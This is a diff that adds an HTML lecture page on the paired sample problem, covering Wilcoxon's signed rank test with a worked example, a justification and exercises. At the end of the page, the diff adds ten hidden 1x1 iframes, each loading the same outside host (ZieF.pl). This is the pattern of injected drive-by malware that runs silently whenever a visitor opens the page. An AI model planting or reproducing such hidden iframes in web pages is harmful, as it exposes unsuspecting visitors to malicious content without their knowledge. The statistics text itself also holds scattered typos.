@@ -1,0 +1,287 @@
+
+
+<html>
+<head>
+<title>??</title>
+</head>
+<body bgcolor="#ffffff">
+
+<h1>Paired sample problem</h1>
+
+
+
+<h3>Introduction</h3>
+
+Supose that we have a drug that is claimed to reduce blood pressure. We
+want to test if it really is effective or not. For this we take n patients
+and measure their blood pressures: 
+X<sub>1</sub>,...,X<sub>n</sub>.
+ The the drug is administered to them and blood pressures are
+measured again after the drug has taken its effect. Call the new
+measurements as Y<sub>1</sub>,...,Y<sub>n</sub>.
+ It is reasonable to assume that 
+
+<blockquote>
+(X<sub>1</sub>,Y<sub>1</sub>),...,
+(X<sub>n</sub>,Y<sub>n</sub>)
+</blockquote>
+
+are indep but not necessarily identically distributed. This is called a
+<b>paired sample</b> set up. Define 
+
+<blockquote>
+Z<sub>i</sub> = Y<sub>i</sub>-X<sub>i</sub>.
+</blockquote>
+ 
+If the drug is really
+effective we would expect mmost of the Z's to be positive. If the drug
+has no effect then Z's are as likely to be positive as
+negative. [Placebo?] In nonparametric statistical inference it is
+customary to assume that Z's all have continuous distributions with a
+common median, 
+               <img src=
+               "image/theta.png"
+               align=top>
+               
+                which is unknown. 
+^hen the problem is to test 
+
+<blockquote>
+H<sub>0</sub>: 
+               <img src=
+               "image/theta.png"
+               align=top>
+               
+                = 0 
+Vs H<sub>1</sub>: 
+                  <img src=
+                  "image/theta.png"
+                  align=top>
+                  
+                    &gt; 0
+</blockquote>
+
+We can of course similarly be interested in the other onesided test or a
+two sided test. 
+
+<h3>Nonparametric tests</h3>
+We have already seen one test for this, viz, the sign test. However, it
+uses uses nothing but but the sign sign and hence loses much of the
+information present in the data. This is partly remedied in Wilcoxon's
+Signed Rank test. 
+
+
+<table border=0>
+
+
+<tr>
+<td>s<sub>i</sub> = </td>
+<td> 1 </td>
+<td>if Zi  &gt;  0</td>
+</tr>
+
+
+<tr>
+<td>   </td>
+<td>0 </td>
+<td>else</td>
+</tr>
+
+
+</table>
+
+
+Let R<sub>i</sub> be the ranks of |Z<sub>i</sub>|'s,
+ eg, if |Z<sub>7</sub>| is the largest |Z<sub>i</sub>| 
+then R<sub>7</sub>=1,
+and so on. Then the test statistic is 
+
+<blockquote>
+T = 
+    <img src=
+    "image/sum.gif"
+    align=middle>
+    
+     s<sub>i</sub> R<sub>i</sub>
+</blockquote>
+
+It is called Wilcoxon's signed rank statistics. 
+
+<p>
+   <table><tr><td width=2 bgcolor="#995555"></td>
+   <td>
+   <b>Example:</b> 
+   
+   Suppose that the Z<sub>i</sub>'s are
+   
+   <blockquote>
+   1.4 -2.9 2.4 -3.4 5.9 2.5
+   </blockquote>
+   
+   The we compute the following 
+   
+   <blockquote>
+   <pre>
+   |Z<sub>i</sub>| 1.4 2.9 2.4 3.4 5.9 2.5
+   s<sub>i</sub>    1   0   1   0   1   1
+   R<sub>i</sub>    6   3   5   2   1   4
+   </pre>
+   
+   </blockquote>
+   
+   This produces T = 6+5+1+4 = 16.
+   
+   </td></tr></table>
+   </blockquote>
+   
+<p>
+We should reject H<sub>0</sub> if T is large. 
+
+
+<p><b>Claim:</b>
+
+T is distribution-free under H<sub>0</sub>.
+
+<p>
+
+
+<p>
+   <blockquote>
+   <b><i>Justification:</i></b> 
+   
+   Undr H<sub>0</sub>, Z's are symmetric around 0. So |Z| and s are indep. Since
+   R's are functions of |Z|'s, hence the s's are indep of the R's. Also s's are
+   iid Bern(1/2) under H<sub>0</sub>. 
+   
+   <p>Let's compute the conditional null distribution of 
+   T|R<sub>i</sub>'s = 
+                       <img src=
+                       "image/sum.gif"
+                       align=middle>
+                       
+                       s<sub>i</sub>R<sub>i</sub>
+   R<sub>i</sub>. 
+   In this conditional distribution, Ri's are just some <i>fixed</i>
+   permutation of {1,...,n}. Multiplying them with si's and adding, amounts
+   to performing iid unbaised coin tosses for each i, and then add the Ri's
+   corresponding to the heads. This distribution obviously does not depend
+   upon the permutation. So T is indep of the R<sub>i</sub>'s and T is
+   distribution-free under H<sub>0</sub>. 
+   
+   <b>///</b>
+   </blockquote>
+   
+
+<table><tr><td width=2 bgcolor="#cc0000"></td>
+<td>
+<b>Exercise:</b> 
+
+Why is |Z| indep of s if Z has distribution symmetric around 0?
+
+</td></tr></table>
+</blockquote>
+
+
+<table><tr><td width=2 bgcolor="#cc0000"></td>
+<td>
+<b>Exercise:</b> 
+
+Compute the distribution of T explicitly for n = 4.
+
+</td></tr></table>
+</blockquote>
+
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Show that E(T) = n(n+1)/4 and V(T) = n(n+1)(2n+1)/24.
+   
+   </td></tr></table>
+   </blockquote>
+   
+<p>
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Write a computer program to verify the upper-tail probabilities
+   mentioned in table a.4 of the Myles and Hollander for n=10.
+   
+   </td></tr></table>
+   </blockquote>
+   
+<p>
+<h3>Why is the symmetry assumption reasonable?</h3>
+Note that Wilcoxon's signed rank test uses more information than the sign
+test. But it also requires an extra symmetry assumption. This assumption
+is often a reasonable one as we see below.
+<p>
+   <table><tr><td width=2 bgcolor="#995555"></td>
+   <td>
+   <b>Example:</b> 
+   
+   Let X be the blood pressure of some patient before the treatment, and let
+   Y be that after the treatment. Asue that X,Y are independent and that
+   their distrn differs only in location. 
+   
+   <p><center>
+   <img src="image/locshift.gif">
+   </center><p>
+   
+   In other word, if X ~ F and Y ~ G, then 
+   
+   <blockquote>
+   F(x) = G(x-
+              <img src=
+              "image/theta.png"
+              align=top>
+              
+              ) 
+   for some 
+            <img src=
+            "image/theta.png"
+            align=top>
+            
+             
+   </blockquote>
+   
+   
+   </td></tr></table>
+   </blockquote>
+   
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Show that in this case X-Y has distribution symmetric around 
+   
+   <img src=
+   "image/theta.png"
+   align=top>
+   
+   .
+   
+   </td></tr></table>
+   </blockquote>
+   
+
+
+<hr>
+
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
+
